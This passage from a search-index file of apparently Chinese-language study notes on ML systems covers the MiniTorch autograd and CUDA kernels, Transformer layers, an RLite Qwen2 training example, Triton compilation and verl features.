       back = minitorch.History(cls, ctx, vals)\n        return minitorch.Tensor(c._tensor, back, backend=c.backend)\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50</p> <pre><code>class Tanh(Function):\n    @staticmethod\n    def forward(ctx: Context, a: Tensor) -&gt; Tensor: \n        out = a.f.tanh_map(a)\n        ctx.save_for_backward(out)\n        return out\n\n    @staticmethod\n    def backward(ctx: Context, grad_output: Tensor) -&gt; Tensor:\n        out = ctx.saved_values[0]\n        return grad_output * (-(out ** 2) + 1)\n</code></pre> <p>\u5bf9\u4e8etorch\u91cc\u7684\u6240\u6709\u64cd\u4f5c\uff0c\u6211\u4eec\u90fd\u9700\u8981\u5b9a\u4e49\u597d\u4ed6\u4eec\u7684\u524d\u5411\u548c\u53cd\u5411\u4f20\u64ad\uff0c\u624d\u80fd\u5728\u540e\u7eed\u505a\u81ea\u52a8\u5fae\u5206</p> <p>\u8fd9\u90e8\u5206\u91cc\u540c\u65f6\u8fd8\u5904\u7406\u4e86\u81ea\u52a8\u5fae\u5206\u7684\u903b\u8f91\uff0c\u4ee5\u53catensor\u6784\u9020\u7684\u903b\u8f91</p> <p>1.4. tensor</p> <p>\u8fd9\u662f\u6574\u4e2atensor\u7cfb\u7edf\u4e2d\u771f\u6b63\u7684\u63a5\u53e3\uff0c\u5176\u4e2d\u7684backend\u662ftensor ops\u7684\u5b9e\u73b0\u63a5\u53e3</p> <pre><code>class Tensor:\n    \"\"\"\n    Tensor is a generalization of Scalar in that it is a Variable that\n    handles multidimensional arrays.\n    \"\"\"\n\n    backend: TensorBackend\n    history: Optional[History]\n    grad: Optional[Tensor]\n    _tensor: TensorData\n    unique_id: int\n    name: str\n\n    def __init__(\n        self,\n        v: TensorData,\n        back: Optional[History] = None,\n        name: Optional[str] = None,\n        backend: Optional[TensorBackend] = None,\n    ):\n        global _tensor_count\n        _tensor_count += 1\n        self.unique_id = _tensor_count\n        assert isinstance(v, TensorData)\n        assert backend is not None\n        self._tensor = v\n        self.history = back\n        self.backend = backend\n        self.grad = None\n        if name is not None:\n            self.name = name\n        else:\n            self.name = str(self.unique_id)\n\n        self.f = backend\n</code></pre> <ul> <li>requires_grad_(): \u542f\u7528/\u7981\u7528\u68af\u5ea6\u8ffd\u8e2a</li> <li>backward(): \u89e6\u53d1\u53cd\u5411\u4f20\u64ad</li> <li>accumulate_derivative(): \u7d2f\u79ef\u68af\u5ea6</li> <li>chain_rule(): \u5e94\u7528\u94fe\u5f0f\u6cd5\u5219</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/MiniTorch/#12-cuda-backend","title":"1.2. cuda backend","text":"<p>\u5728\u5b9e\u9a8c3\u5f00\u59cb\u6211\u4eec\u6b63\u5f0f\u5f15\u5165cuda\u7684\u540e\u7aef\u5b9e\u73b0\uff0c\u6211\u4eec\u5728<code>cuda_kernel_ops.py</code>\u4e2d\u5f15\u5165\u4e86cuda\u7684\u63a5\u53e3</p> <pre><code>def map(fn: Callable[[float], float]) -&gt; MapProto:\n        \"See `tensor_ops.py`\"\n        fn_id = fn_map[fn]\n\n        def ret(a: Tensor, out: Optional[Tensor] = None) -&gt; Tensor:\n            if out is None:\n                out = a.zeros(a.shape)\n\n            lib.tensorMap.argtypes = [\n                np.ctypeslib.ndpointer(dtype=datatype, ndim=1, flags='C_CONTIGUOUS'),    # out_storage\n                np.ctypeslib.ndpointer(dtype=np.int32, ndim=1, flags='C_CONTIGUOUS'),    # out_shape\n                np.ctypeslib.ndpointer(dtype=np.int32, ndim=1, flags='C_CONTIGUOUS'),    # out_strides\n                ctypes.c_int,                                                            # out_size\n                np.ctypeslib.ndpointer(dtype=datatype, ndim=1, flags='C_CONTIGUOUS'),    # in_storage\n                np.ctypeslib.ndpointer(dtype=np.int32, ndim=1, flags='C_CONTIGUOUS'),    # in_shape\n                np.ctypeslib.ndpointer(dtype=np.int32, ndim=1, flags='C_CONTIGUOUS'),    # in_strides\n                ctypes.c_int,                                                            # in_size\n                ctypes.c_int,                                                            # shape_len\n                ctypes.c_int,                                                            # fn_id\n            ]\n\n            lib.tensorMap.restype = None\n\n            # assert out.size == a.size, f\"zip {out.size}, {a.size}\"\n\n            lib.tensorMap(\n                out._tensor._storage,\n                out._tensor._shape.astype(np.int32),\n                out._tensor._strides.astype(np.int32),\n                out.size,\n                a._tensor._storage,\n                a._tensor._shape.astype(np.int32),\n                a._tensor._strides.astype(np.int32),\n                a.size,\n                len(a.shape),\n                fn_id\n            )\n            return out\n\n        return ret\n</code></pre> <p>\u8fd9\u662f\u5728python\u4e2d\u8c03\u7528cuda\u540e\u7aef\u7684\u5b9e\u73b0\uff0c\u8fd9\u91cc\u7ed9\u4e86\u4e24\u79cd\u5b9e\u73b0</p> <ul> <li>cuda_kernel_ops.py \u8fd9\u4e2a\u662f\u4e0a\u8ff0\u6211\u4eec\u81ea\u5df1\u5199\u7684kernel\u7684\u8c03\u7528\u65b9\u6848</li> <li>cuda_ops.py \u8fd9\u4e2a\u662f\u7528numba\u8fd9\u4e2apython\u7684\u5305\u91cc\u9762\u7684\u4e00\u4e9bcuda kernel\u7b80\u5355\u7684\u7ec4\u5408\uff0c\u5b9e\u73b0\u76f8\u540c\u529f\u80fd\u7684\u5b9e\u73b0</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/MiniTorch/#13-module","title":"1.3. Module","text":"<p>\u8fd9\u4e2a\u6a21\u5757\u4e2d\u5b9e\u73b0\u4e86\u5404\u79cd\u795e\u7ecf\u7f51\u7edc\u7ec4\u4ef6\uff0c\u6bd4\u5982Linear\uff0cDropout\uff0cEmbedding\uff0cNorm\uff0cAttention\u7b49\u7b49\uff0c\u4ee5\u4e0b\u662f\u4e00\u4e2a\u4f8b\u5b50</p> <pre><code>class Dropout(Module):\n    def __init__(self, p_dropout: float=0.1):\n        super().__init__()\n        \"\"\"During training, randomly zeroes some of the elements of the input tensor with probability :attr:`p_dropout`.\n\n        Attributes: \n            p_dropout : Probability an element will be zeroed.\n        \"\"\"\n        self.p_dropout = p_dropout\n\n    def forward(self, x: Tensor) -&gt; Tensor: \n        \"\"\"During training, randomly zero out elements of a tensor and scale by (1 - p_dropout)\n\n        Args: \n            x : Tensor of shape (*)\n\n        Returns: \n            output : Tensor of shape (*)\n        \"\"\"\n        if not self.training or self.p_dropout == 0.0:\n            return x\n\n        rate = self.p_dropout\n        r = tensor_from_numpy(np.random.rand(*x.shape), backend=x.backend)\n        drop = rate &lt; r\n        return x * drop / (1 - rate)\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/MiniTorch/#14-scalar","title":"1.4. Scalar","text":"<p>\u6807\u91cf\u8ba1\u7b97\uff0c\u8fd9\u90e8\u5206\u662f\u4e00\u4e2a\u6807\u91cf\u7cfb\u7edf\u7684\u5b9e\u73b0\uff0c\u4e3b\u8981\u662f\u5b9e\u73b0\u4e00\u4e9b\u6807\u91cf\u64cd\u4f5c\u7684\u524d\u5411\u548c\u53cd\u5411\u64cd\u4f5c</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/MiniTorch/#2","title":"2. \u5b9e\u9a8c\u5185\u5bb9","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/MiniTorch/#21-cuda-programming","title":"2.1 Cuda Programming","text":"<p>\u5b9e\u9a8c\u7684\u7b2c\u4e00\u90e8\u5206\u662fcuda programming\uff0c\u5728\u7ed9\u51fapython\u63a5\u53e3\u7684\u60c5\u51b5\uff0c\u5b9e\u73b0\u51e0\u4e2acuda\u51fd\u6570</p> <pre><code>__device__ int index_to_position(const int* index, const int* strides, int num_dims) {\n    int position = 0;\n    for (int i = 0; i &lt; num_dims; ++i) {\n        position += index[i] * strides[i];\n    }\n    return position;\n}\n\n__device__ void to_index(int ordinal, const int* shape, int* out_index, int num_dims) {\n    int cur_ord = ordinal;\n    for (int i = num_dims - 1; i &gt;= 0; --i) {\n        int sh = shape[i];\n        out_index[i] = cur_ord % sh;\n        cur_ord /= sh;\n    }\n}\n\n__device__ void broadcast_index(const int* big_index, const int* big_shape, const int* shape, int* out_index, int num_dims_big, int num_dims) {\n    for (int i = 0; i &lt; num_dims; ++i) {\n        if (shape[i] &gt; 1) {\n            out_index[i] = big_index[i + (num_dims_big - num_dims)];\n        } else {\n            out_index[i] = 0;\n        }\n    }\n}\n</code></pre> <p>\u8fd9\u4e09\u4e2a\u51fd\u6570\uff0c\u662f\u6846\u67b6\u4e2d\u7ed9\u51fa\u7684\u5185\u5bb9\uff0c\u4e5f\u662f\u5f20\u91cf\u64cd\u4f5c\u4e2d\u5f88\u91cd\u8981\u7684\u4e09\u4e2a\u64cd\u4f5c</p> <ul> <li>index_to_position \u5c06\u903b\u8f91\u4e0a\u7684\u5f20\u91cf\u4f4d\u7f6e\u8f6c\u6362\u6210\u4e00\u7ef4\u5b58\u50a8\u4e2d\u7684position</li> <li>to_index \u5c06ordinal\u4ee3\u8868\u7684\u4e00\u7ef4\u5b58\u50a8\u7684position\u8f6c\u6362\u6210\u5177\u4f53\u7684\u903b\u8f91\u4e0a\u7684index</li> <li>broadcast_index \u662f\u5f20\u91cf\u64cd\u4f5c\u4e2d\u7684\u5e7f\u64ad\u673a\u5236\u7684\u5177\u4f53\u5b9e\u73b0</li> </ul> <p>\u8fd9\u4e2a\u5e7f\u64ad\u673a\u5236\u6bd4\u8f83\u590d\u6742\uff0c\u6211\u4eec\u6765\u89e3\u91ca\u4e00\u4e0b\uff0c\u8fd9\u4e2a\u51fd\u6570\u662f\u8f93\u5165\u4e00\u4e2a\u5927\u6570\u7ec4\u7684big_index\uff0c\u67d0\u4e2a\u5143\u7d20\u7684\u4f4d\u7f6e\uff0c\u6211\u4eec\u8981\u77e5\u9053\u5b83\u548c\u54ea\u4e2a\u5c0f\u6570\u7ec4\u7684\u4f4d\u7f6e\u4e0a\u7684\u5143\u7d20\u8fdb\u884c\u8ba1\u7b97\uff0c\u4e5f\u5373out_index</p> <p></p> <p>\u5e7f\u64ad\u7684\u673a\u5236\u662f\u8fd9\u6837\u7684\uff0c\u4ece\u7ef4\u5ea6\u7684\u672b\u7aef\u5f00\u59cb\u904d\u5386\uff0c\u5f53\u524d\u7ef4\u5ea6\u5927\u4e8e1\uff0c\u5219\u8be5\u7ef4\u5ea6\u4e0d\u80fd\u88ab\u5e7f\u64ad\uff0c\u8be5\u7ef4\u5ea6\u4e2d\u9700\u8981\u627e\u5230\u548c\u5927\u5f20\u91cf\u5b8c\u5168\u4e00\u81f4\u7684\u5750\u6807\uff0c\u5982\u679c\u6ca1\u6709\u627e\u5230\uff0c\u90a3\u4e48\u5e7f\u64ad\u4f1a\u5931\u8d25\uff1b\u5982\u679c\u5f53\u524d\u7ef4\u5ea6\u4e3a1\uff0c\u5219\u8be5\u7ef4\u5ea6\u53ef\u4ee5\u88ab\u5e7f\u64ad\uff0c\u5e7f\u64ad\u7684\u65b9\u5f0f\u5c31\u662f\u4e0d\u8bba\u4ec0\u4e48\u65f6\u5019\u90fd\u8bbf\u95ee\u7b2c0\u4e2a\u5143\u7d20\uff0c\u89c6\u4e3a\u7b2c0\u4e2a\u5143\u7d20\u6269\u5f20\u5230\u4e86\u6240\u6709\u5730\u65b9</p> <p>\u501f\u52a9\u8fd9\u4e09\u4e2a\u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u6765\u5b9e\u73b0reduce\uff0czip\uff0cmap\u7b49\u5185\u5bb9</p> <p>\u6bd4\u8f83\u7b80\u5355\u7684\u6bd4\u5982 map \u64cd\u4f5c\uff0c\u662f\u5bf9\u4e8e\u5f20\u91cf\u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\u90fd\u8fdb\u884c\u4e00\u6837\u7684\u64cd\u4f5c\uff0c\u6bd4\u5982\u5f20\u91cf\u52a0\u4e0a\u4e00\u4e2a\u6807\u91cf</p> <pre><code>__global__ void mapKernel(\n    float* out, \n    int* out_shape, \n    int* out_strides, \n    int out_size, \n    float* in_storage, \n    int* in_shape, \n    int* in_strides,\n    int shape_size,\n    int fn_id\n) {\n    int out_index[MAX_DIMS];\n    int in_index[MAX_DIMS];\n\n    int idx = blockIdx.x * blockDim.x + threadIdx.x;\n\n    if (idx &lt; out_size){\n      to_index(idx, out_shape, out_index, shape_size);  // \u5c06\u6570\u503c\u4e0a\u7684\u7d22\u5f15\uff0c\u8f6c\u79fb\u5230\u5177\u4f53\u7684\u5f62\u72b6\u4e0a\u7684\u4f4d\u7f6e\n\n      broadcast_index(out_index, out_shape, in_shape, in_index, shape_size, shape_size); // \u5c06\u5927\u7684index\u5e7f\u64ad\u5230\u5c0f\u7684index\u4e0a\n\n      int in_pos = index_to_position(in_index, in_strides, shape_size);\n      int out_pos = index_to_position(out_index, out_strides, shape_size);\n\n      out[out_pos] = fn(fn_id, in_storage[in_pos]);\n    }\n}\n</code></pre> <p>\u5176\u4e2d\u6bd4\u8f83\u590d\u6742\u7684\u662f\u77e9\u9635\u4e58\u6cd5\u8fd9\u4e2a\u64cd\u4f5c</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/MiniTorch/#22-minitorch","title":"2.2. MiniTorch","text":"<p>\u7b2c\u4e8c\u90e8\u5206\u7684\u5b9e\u9a8c\u662f\u8ba9\u6211\u719f\u6089MiniTorch\u8fd9\u4e2a\u6846\u67b6\uff0c\u5728\u8fd9\u4e2a\u5b9e\u9a8c\u4e2d\u7684MiniTorch\u662f\u5b8c\u5168\u4ee5Python\u4e3a\u540e\u7aef\u5b9e\u73b0\u7684\u7b80\u6613\u7248\u672c</p> <p>\u7b2c\u4e00\u5757\u7684\u4efb\u52a1\u662f\u8ba9\u6211\u4eec\u5b9e\u73b0AutoDiff</p> <pre><code>def topological_sort(variable: Variable) -&gt; Iterable[Variable]:\n    \"\"\"\n    Computes the topological order of the computation graph.\n\n    Args:\n        variable: The right-most variable\n\n    Returns:\n        Non-constant Variables in topological order starting from the right.\n    \"\"\"\n    from typing import Set\n    order: List[Variable] = []\n    visited: Set[int] = set()\n\n    def dfs(var: Variable):\n        if var.unique_id in visited or var.is_constant():\n            return\n        visited.add(var.unique_id)\n        for parent in var.parents:\n            dfs(parent)\n        order.append(var)\n\n    dfs(variable)\n    return reversed(order)\n\n\ndef backpropagate(variable: Variable, deriv: Any) -&gt; None:\n    \"\"\"\n    Runs backpropagation on the computation graph.\n    \"\"\"\n    topo_order = list(topological_sort(variable))\n    derivatives = {variable.unique_id: deriv}\n\n    for var in topo_order:\n        if var.unique_id not in derivatives:\n            continue\n\n        d_var = derivatives[var.unique_id]\n\n        if var.is_leaf():\n            var.accumulate_derivative(d_var)\n        elif not var.is_constant():\n            for parent, d_parent in var.chain_rule(d_var):\n                if parent.unique_id not in derivatives:\n                    derivatives[parent.unique_id] = d_parent\n                else:\n                    derivatives[parent.unique_id] += d_parent\n</code></pre> <p>\u8fd9\u90e8\u5206\u548c\u524d\u9762\u7684\u6846\u67b6\u4ecb\u7ecd\u4e00\u81f4\uff0c\u8fd9\u91cc\u53ea\u662f\u5728\u505a\u68af\u5ea6\u7684\u4f20\u9012\uff0c\u800c\u6ca1\u6709\u505a\u5b9e\u9645\u7684\u68af\u5ea6\u8ba1\u7b97\u64cd\u4f5c</p> <p>\u8fd9\u91cc\u7684backpropagate\u51fd\u6570\u5728\u540e\u7eed\u53d1\u73b0\u4e86\u4e00\u4e9b\u95ee\u9898</p> <pre><code>    # derivatives = {variable.unique_id: deriv}\n\n    derivatives = {v.unique_id:0 for v in topo_order}\n    derivatives[variable.unique_id] = deriv\n</code></pre> <p>\u68af\u5ea6\u7684\u521d\u59cb\u5316\u9700\u8981\u8fd9\u6837\u505a\uff0c\u624d\u80fd\u901a\u8fc7\u6d4b\u8bd5\uff0c\u5426\u5219\u68af\u5ea6\u4f1a\u548c\u6d4b\u8bd5\u7ed3\u679c\u5f88\u76f8\u4f3c\uff0c\u4f46\u662f\u5728\u6700\u540e\u51e0\u4f4d\u4e0d\u4e00\u81f4</p> <p>\u8fd9\u91cc\u6709\u4e2a\u5f88\u7ec6\u8282\u7684bug\uff0c\u6211\u4eec\u5728\u4ee5\u4e0b\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u76f4\u63a5\u8ba9<code>derivatives[parent.unique_id] = d_parent</code> \uff0c\u8fd9\u4f1a\u5bfc\u81f4\u8fd9\u4e2a\u5b57\u5178\u4e0a\u7684\u6570\u636e\u76f4\u63a5\u5f15\u7528\u4e86\u8fd9\u4e2ad_parent\uff0c\u4e00\u65e6\u8ba1\u7b97\u56fe\u4e2d\u6709\u591a\u4e2a\u5730\u65b9\u5f15\u7528\u4e86\u8fd9\u4e2ad_parent\uff0c\u540e\u7eed\u6709\u5176\u4e2d\u4e00\u4e2a\u5730\u65b9\u4fee\u6539\u4e00\u4e2ad_parent\uff0c\u5176\u4ed6\u6240\u6709\u5730\u65b9\u90fd\u4f1a\u76f8\u5e94\u7684\u4fee\u6539\uff0c\u4f46\u662f\u5176\u5b9e\u8fd9\u65f6\u5019\u5176\u4ed6\u5730\u65b9\u4e0d\u5e94\u8be5\u8fdb\u884c\u53d8\u5316</p> <pre><code>            for parent, d_parent in var.chain_rule(d_var):\n                if parent.unique_id not in derivatives:\n                    derivatives[parent.unique_id] = d_parent\n                else:\n                    derivatives[parent.unique_id] += d_parent\n</code></pre> <p>\u4e86\u89e3\u4e86\u8fd9\u4e2a\u539f\u56e0\u7684\u65f6\u5019\uff0c\u51fa\u4e86\u4e00\u5f00\u59cb\u5c31\u521d\u59cb\u597d\u6240\u6709\u4e1c\u897f\u7684\u65b9\u6848\u4ee5\u5916\uff0c\u8fd8\u53ef\u4ee5\u7528\u4ee5\u4e0b\u8fd9\u79cd\u65b9\u5f0f\u8fdb\u884c\u62f7\u8d1d\uff0c\u800c\u4e0d\u662f\u5f15\u7528</p> <pre><code>            for parent, d_parent in var.chain_rule(d_var):\n                if parent.unique_id not in derivatives:\n                    derivatives[parent.unique_id] = d_parent + 0.0\n                else:\n                    derivatives[parent.unique_id] += d_parent\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/MiniTorch/#23-transformer","title":"2.3. Transformer","text":"<p>\u7b2c\u4e09\u90e8\u5206\u7684\u5b9e\u9a8c\u9700\u8981\u6211\u4eec\u7528MiniTorch\u6846\u67b6\u5b9e\u73b0Transformer\uff0c\u6b64\u65f6\u7684MiniTorch\u8865\u9f50\u4e86\u57fa\u4e8ecuda\u7684\u540e\u7aef\uff0c\u5c06\u524d\u9762\u4e24\u4e2a\u5b9e\u9a8c\u7ec4\u5408\u8d77\u6765</p> <p>\u8fd9\u4e00\u90e8\u5206\u5176\u5b9e\u5f88\u50cfCS336\u7684lab1\uff0c\u5b9e\u73b0Transformer\u7684\u5404\u4e2a\u7ec4\u4ef6\uff0c\u4f46\u662f\u6700\u5927\u7684\u533a\u522b\u5728\u4e8e\u6211\u4eec\u662f\u5728\u81ea\u5df1\u7684MiniTorch\u4e0a\u5b9e\u73b0\uff0c\u4eceCuda\u540e\u7aef\u5230Tensor\u5b9e\u73b0\uff0c\u4ee5\u53ca\u81ea\u52a8\u5fae\u5206\uff0c\u90fd\u5728\u8fd9\u4e2a\u6846\u67b6\u4e2d\uff0c\u6ca1\u6709\u9ed1\u76d2\uff0c\u8fd9\u662f\u4e00\u4e2a\u5f88\u68d2\u7684\u4e8b\u60c5</p> <p>\u6211\u4eec\u4f9d\u6b21\u6765\u770b\u51e0\u4e2a\u5b9e\u73b0</p> <pre><code>class LayerNorm1d(Module):\n    def __init__(self, dim: int, eps: float, backend: TensorBackend):\n        super().__init__()\n        \"\"\"Applies Layer Normalization over a mini-batch of 1-dimensional inputs.\n\n        Args: \n            dim : Expected size of the last dimension to apply layer normalization.\n            eps : A value added for numerical stability.\n\n        Attributes: \n            weights : the learnable weights of the module of shape (self.dim, ) initialized to 1.\n            bias    : the learnable bias of the module of shape (self.dim, ) initialized to 0.\n        \"\"\"\n        self.dim = dim\n        self.eps = eps\n        self.weights = Parameter(ones_tensor_from_numpy((dim, ), backend=backend))\n        self.bias = Parameter(zeros_tensor_from_numpy((dim, ), backend=backend))\n\n    def forward(self, x: Tensor) -&gt; Tensor:\n        \"\"\"Applies Layer Normalization over a mini-batch of inputs. \n        NOTE: You can assume the input to this layer is a 2D tensor of shape (batch_size, dim)\n        You will use implicit broadcasting in miniTorch to use the weight and bias.\n\n        Input: \n            x - Tensor of shape (bs, dim)\n\n        Output: \n            output - Tensor of shape (bs, dim)\n        \"\"\"\n        batch, dim = x.shape\n        mean = x.mean(dim=1).view(batch, 1)\n        variance = x.var(dim=1).view(batch, 1)\n        x_normalized = (x - mean) / ((variance + self.eps) ** 0.5) # eps \u7528\u4e8e\u9632\u6b62\u96640\u6ea2\u51fa\u7684\u95ee\u9898\n        out = x_normalized * self.weights.value.view(1, dim) + self.bias.value.view(1, dim)\n        return out\n</code></pre> <p>Layer Norm\u7684\u5b9e\u73b0\uff0c\u5148\u5bf9\u7b2c1\u4e2a\u7ef4\u5ea6\u8ba1\u7b97\u5747\u503c\u548c\u65b9\u5dee\uff0c\u968f\u540e\u8fdb\u884cnorm\uff0c\u6700\u540e\u4e58\u4ee5\u4e00\u4e2a\u53ef\u5b66\u4e60\u7684\u53c2\u6570</p> <pre><code>class Embedding(Module):\n    def __init__(self, num_embeddings: int, embedding_dim: int, backend: TensorBackend):\n        super().__init__()\n        \"\"\"\n        Maps one-hot word vectors from a dictionary of fixed size to embeddings.\n\n        Args:\n            num_embeddings : The vocabulary size\n            embedding_dim : The size of each embedding vector\n\n        Attributes:\n            weight : The learnable weights of shape (num_embeddings, embedding_dim) initialized from N(0, 1).\n        \"\"\"\n        self.backend = backend\n        self.num_embeddings = num_embeddings # Vocab size\n        self.embedding_dim  = embedding_dim  # Embedding Dimension\n        self.weights = Parameter(rand((num_embeddings, embedding_dim), backend=backend))\n\n    def forward(self, x: Tensor):\n        bs, seq_len = x.shape\n        V = self.num_embeddings\n\n        # 1. \u5c06\u8f93\u5165\u7684\u8bcd\u6c47\u7d22\u5f15\u5f20\u91cf x \u8f6c\u6362\u6210 One-Hot \u5f20\u91cf H (B, L, V)\n        H = one_hot(x, V) \n\n        # 2. \u6241\u5e73\u5316 One-Hot \u5f20\u91cf\uff0c\u4f7f\u5176\u53d8\u4e3a (B*L, V) \u5f62\u72b6\n        #    \u8fd9\u6837\u5728 MatMul \u5185\u90e8\uff0c\u5b83\u548c (V, D) \u7684\u6743\u91cd\u90fd\u4f1a\u88ab\u89c6\u4e3a 3D \u5f20\u91cf (1, M, K) \u8fdb\u884c\u6279\u5904\u7406\n        H_flat = H.view(bs * seq_len, V) \n\n        # 3. \u6267\u884c\u77e9\u9635\u4e58\u6cd5 H_flat @ W\u3002W \u5f62\u72b6\u4e3a (V, D)\u3002\n        #    \u7ed3\u679c output_flat \u5f62\u72b6\u4e3a (B*L, D)\n        output_flat = H_flat.__matmul__(self.weights.value)\n\n        # 4. \u91cd\u5851\u56de\u671f\u671b\u7684 (B, L, D) \u5f62\u72b6\n        return output_flat.view(bs, seq_len, self.embedding_dim)\n</code></pre> <p>Embedding \u5c42\uff0c\u5c06\u4e00\u4e2a\u8bcd\u8868\u7d22\u5f15\uff08one-hot \u5411\u91cf\uff09\u8f6c\u6362\u6210\u4e00\u4e2a\u4f4e\u7ef4\u5ea6\u7684\u5411\u91cf\u8868\u793a</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/MiniTorch/#24-transformer-accelerate-by-cuda","title":"2.4. Transformer Accelerate by Cuda","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/RLite/","title":"RLite","text":"<p>RLite\uff0c\u6781\u7b80\u7684RL\u6846\u67b6\uff0cGithub link</p> <p>\u4f7f\u7528Pytorch\u7684\u63a5\u53e3\uff0c\u4f4e\u5b66\u4e60\u6210\u672c\u7684\u8fdb\u884cRL</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/RLite/#example","title":"Example","text":"<p>Train Qwen2\uff0c\u4ec5\u970060\u884c</p> <pre><code>import torch\nimport torch.nn.functional as F\nimport torch.optim\nfrom transformers import Qwen2Config, Qwen2ForCausalLM\n\nimport rlite\nimport rlite.nn\nfrom rlite import NeedParallel, RliteTrainEngine\n\n\nclass MyQwenModel(rlite.nn.HuggingFaceFsdp2TrainModule, Qwen2ForCausalLM):\n    def on_weights_materialized(self):\n        self.optimizer = torch.optim.AdamW(self.parameters(), lr=1e-5)\n\n    def train_step(self, input_ids: list[list[int]], gradient_accumulation_steps: int = 1):\n        input_ids = torch.tensor(input_ids, dtype=torch.long, device=\"cuda\")\n\n        logits = self(input_ids).logits[:, :-1].contiguous()\n        labels = input_ids[:, 1:].contiguous()\n\n        loss = F.cross_entropy(logits.view(-1, logits.size(-1)), labels.view(-1)).mean()\n        loss = loss / gradient_accumulation_steps\n        loss.backward()\n\n        return loss.item()\n\n    def optimizer_step(self):\n        self.optimizer.step()\n        self.optimizer.zero_grad()\n\n\nif __name__ == \"__main__\":\n    rlite.init()\n\n    with rlite.device(\"meta\"):  # Init on meta device\n        config = Qwen2Config.from_pretrained(\n            \"Qwen/Qwen2.5-1.5B-Instruct\",\n            attn_implementation=\"flash_attention_2\"\n        )\n        # NOTE: MyQwenModel.from_pretrained may read the checkpoint files\n        module = MyQwenModel(config)\n        module.gradient_checkpointing_enable()\n\n    engine = RliteTrainEngine(module, executor=\"fsdp2\")  # Must on meta device\n    # NOTE: here tensor_parallel_size means the number of parameter shards\n    engine.build(tensor_parallel_size=4)\n\n    num_gpus = 8\n    gradient_accumulation_steps = 4\n\n    losses = []\n\n    for _ in range(gradient_accumulation_steps):\n        input_ids = torch.randint(0, 10000, (num_gpus, 1024))\n        losses_for_each_gpu = engine.train_step(\n            NeedParallel(input_ids),\n            gradient_accumulation_steps=gradient_accumulation_steps\n        )\n        losses.append(losses_for_each_gpu)\n\n    print(losses)\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Smol-Training-Playbook/","title":"Smol Training Playbook","text":"<p>https://huggingface.co/spaces/HuggingFaceTB/smol-training-playbook</p> <p>SmolLM\uff0cHuggingface\u7684\u5f00\u6e90LLM\uff0c\u4e0a\u8ff0PlayBook\u975e\u5e38\u5b8c\u6574\u4e14\u7ec6\u8282\u5730\u4ecb\u7ecd\u4e86\u5176\u8bad\u7ec3\u7684\u5404\u79cd\u7ec6\u8282</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Triton/","title":"Triton","text":"<p>Triton\u662fOpenAI\u5f00\u53d1\u7684\u57fa\u4e8ePython\u6765\u7f16\u5199Cuda Kernel\u7684\u5e93\uff0c\u672c\u6587\u4e3b\u8981\u5305\u62ec\u4e86</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Triton/#triton-compile","title":"Triton Compile","text":"<pre><code>@triton.jit\ndef my_kernel(...):\n    ...\nmy_kernel[grid](x_ptr, y_ptr, n)\n</code></pre> <p>\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u4f7f\u7528triton\u7f16\u5199\u5185\u6838\u7684\u64cd\u4f5c\u5982\u4e0a\u6587</p> <p></p> <p>Python DSL\u5c42\u7ea7\uff0c\u53ea\u662f\u505a\u4e00\u7cfb\u5217\u7684\u8868\u8ff0\uff0c\u5e76\u4e0d\u5b9e\u9645\u6267\u884ckernel\uff0c\u5728Compile\u5c42\u7ea7\u5c06\u62bd\u8c61\u51fa\u6765\u7684Python\u8868\u793a\u8f6c\u6362\u6210\u53ef\u6267\u884c\u7684\u4ee3\u7801\u5f62\u5f0f\uff0c\u968f\u540e\u5728Runtime\u5c42\u7ea7\u8dd1\u8d77\u6765</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl/","title":"Verl","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl/#verl","title":"verl \u76ee\u524d\u7684\u652f\u6301\u7279\u6027","text":"<ul> <li>FSDP + Megatron for training</li> <li>vllm, sglang, transformers for rollout</li> </ul> <p>RL\u7684\u6d41\u7a0b\u5b9e\u9645\u662f\u4e00\u4e2a\u6570\u636e\u6d41\u8fc7\u7a0b\uff0c\u76f8\u5bf9\u4e8eSFT\u6765\u8bf4\u66f4\u52a0\u590d\u6742</p> <ul> <li>Multiple models: actor, critic, reference, reward</li> <li>Muliiple stages: generating, preparing experiences, training</li> </ul> 